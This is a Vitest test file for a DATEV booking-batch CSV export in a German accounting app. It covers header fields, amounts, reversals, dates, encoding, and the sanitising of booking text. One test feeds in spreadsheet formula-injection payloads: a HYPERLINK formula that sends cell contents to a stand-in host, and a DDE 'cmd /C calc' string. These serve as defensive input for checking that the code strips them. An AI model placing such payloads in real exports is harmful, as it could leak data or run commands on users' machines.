import { describe, expect, it } from "vitest";
import { belegfeld, buchungstext, buildBuchungsstapel, COLUMNS, datevDate, toWindows1252 } from "./datev";
import type { Booking, Tenant } from "./db/schema";

const tenant: Tenant = {
  id: "t",
  name: "Feldbach Design GmbH",
  kontenrahmen: "SKR03",
  beraterNr: 1001,
  mandantenNr: 10001,
  fiscalYearStartMonth: 1,
  createdAt: new Date(),
};

const booking = (over: Partial<Booking>): Booking => ({
  id: "b",
  tenantId: "t",
  documentId: "d",
  bookingDate: "2026-09-03",
  amountCents: 11864,
  account: "4930",
  contraAccount: "1600",
  taxKey: "9",
  text: "Papierwerk Sommer KG PW-2026-0815",
  reference: "PW-2026-0815",
  source: "ki",
  lockedAt: new Date(),
  reversalOf: null,
  createdAt: new Date(),
  ...over,
});

const file = (bookings: Booking[]) =>
  buildBuchungsstapel(bookings, {
    tenant,
    from: "2026-09-01",
    to: "2026-09-30",
    createdAt: new Date("2026-10-12T09:30:15.123Z"),
    locked: true,
  });

describe("DATEV-Buchungsstapel", () => {
  it("Kopfsatz: EXTF 700, Kategorie 21, Version 13, Berater, Mandant, WJ, Sachkontenlänge 4, Zeitraum, SKR 03", () => {
    const header = (file([]).split("\r\n")[0] ?? "").split(";");
    expect(header.slice(0, 6)).toEqual(['"EXTF"', "700", "21", '"Buchungsstapel"', "13", "20261012093015123"]);
    expect(header.slice(10, 16)).toEqual(["1001", "10001", "20260101", "4", "20260901", "20260930"]);
    expect(header[20]).toBe("1");
    expect(header[21]).toBe('"EUR"');
    expect(header[26]).toBe('"03"');
    expect(header).toHaveLength(31);
  });

  it("Zeile 2 sind die Spaltennamen", () => {
    expect(file([]).split("\r\n")[1]).toBe(COLUMNS.join(";"));
  });

  it("Buchung: Betrag mit Komma ohne Tausenderpunkt, S, Konto, Gegenkonto, BU, TTMM, Belegfeld, Text", () => {
    const line = file([booking({ amountCents: 123456 })]).split("\r\n")[2];
    expect(line).toBe(
      '1234,56;"S";"EUR";;;"";4930;1600;"9";0309;"PW-2026-0815";"";;"Papierwerk Sommer KG PW-2026-0815"',
    );
  });

  it("Storno mit negativem Betrag steht im Haben, Betrag ohne Vorzeichen", () => {
    const line = file([booking({ amountCents: -11864 })]).split("\r\n")[2] ?? "";
    expect(line.startsWith('118,64;"H";')).toBe(true);
  });

  it("Reverse Charge mit BU 46 und leerem Schlüssel bleiben als Text erhalten", () => {
    const [rc, none] = file([booking({ taxKey: "46" }), booking({ taxKey: "" })])
      .split("\r\n")
      .slice(2);
    expect(rc?.split(";")[8]).toBe('"46"');
    expect(none?.split(";")[8]).toBe('""');
  });

  it("Datum TTMM", () => {
    expect(datevDate("2026-01-05")).toBe("0501");
    expect(datevDate("2026-12-31")).toBe("3112");
  });

  it("Buchungstext höchstens 60 Zeichen, eine Zeile; Anführungszeichen werden verdoppelt", () => {
    expect(buchungstext(`${"x".repeat(70)}`)).toHaveLength(60);
    expect(buchungstext("Zeile 1\nZeile 2")).toBe("Zeile 1 Zeile 2");
    const line = file([booking({ text: 'Café "Zur Linde"; Bewirtung' })]).split("\r\n")[2] ?? "";
    expect(line.endsWith('"Café ""Zur Linde""; Bewirtung"')).toBe(true);
  });

  it("Text aus dem Beleg wird in einer Tabellenkalkulation nicht zur Formel", () => {
    expect(buchungstext('=HYPERLINK("https://x.example/?"&A1;"Klick")')).toBe(
      'HYPERLINK("https://x.example/?"&A1;"Klick")',
    );
    expect(buchungstext("+1+1")).toBe("1+1");
    expect(buchungstext("@SUM(A1)")).toBe("SUM(A1)");
    expect(buchungstext("Papier - Ordner")).toBe("Papier - Ordner");
    expect(buchungstext("-5 % Rabatt Papierwerk")).toBe("-5 % Rabatt Papierwerk");
    expect(buchungstext("-cmd|' /C calc'!A0")).toBe("cmd|' /C calc'!A0");
  });

  it("Belegfeld 1 nur erlaubte Zeichen, höchstens 36", () => {
    expect(belegfeld("RE 2026/äö_15#")).toBe("RE2026/15");
    expect(belegfeld("A".repeat(40))).toHaveLength(36);
  });

  it("Windows-1252: Umlaute, ß und € als einzelne Bytes, Unbekanntes als ?", () => {
    expect([...toWindows1252("äöüÄÖÜß€")]).toEqual([0xe4, 0xf6, 0xfc, 0xc4, 0xd6, 0xdc, 0xdf, 0x80]);
    expect(toWindows1252("Zł").toString("latin1")).toBe("Z?");
    expect(toWindows1252("„Typografie“")[0]).toBe(0x84);
  });

  it("Zeilenende CRLF, Datei endet mit Zeilenumbruch", () => {
    const text = file([booking({})]);
    expect(text.endsWith("\r\n")).toBe(true);
    expect(text.split("\r\n")).toHaveLength(4);
  });
});
